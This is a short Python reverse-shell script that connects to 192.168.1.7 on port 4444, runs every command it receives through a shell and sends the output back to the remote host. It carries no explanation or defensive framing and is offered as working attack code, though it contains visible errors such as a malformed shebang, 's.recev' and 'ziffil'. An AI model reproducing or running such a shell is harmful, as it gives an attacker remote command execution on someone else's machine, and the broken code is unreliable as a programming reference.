#!/bin/bash/env python3 
import os 
import sys
import socket, subprocess as sp 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 4444
host = "192.168.1.7"
s.connect((host, port))
print("connected")
while 1:
      command = str(s.recev(1024))
      if command != ("exit()"):
        sh = sp.Popen(command, shell=True,
                    stdout = sp.PIPE,
                    stderr = sp.PIPE,
                    stdin = sp.PIPE)
        out, err = sh.communicate()
        result = str(out) + str(err)
        lenght = str(len(result)).ziffil(16)
        s.send(lenght + result)
      else :
        break
s.close()
